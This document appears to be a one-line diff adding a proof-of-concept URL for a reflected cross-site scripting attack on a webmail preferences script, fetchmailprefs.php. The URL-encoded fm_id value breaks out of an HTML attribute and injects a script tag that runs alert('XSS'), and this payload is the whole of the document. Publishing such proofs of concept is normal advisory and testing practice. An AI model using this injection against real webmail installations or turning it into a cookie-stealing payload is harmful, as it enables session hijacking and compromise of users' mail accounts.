@@ -1,0 +1,1 @@
+http://www.example.com/path/fetchmailprefs.php?actionID=fetchmail_prefs_save&fm_driver=imap&fm_id=zzz%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E%3Cx+y%3D%22&fm_protocol=pop3&fm_lmailbox=INBOX&save=Create
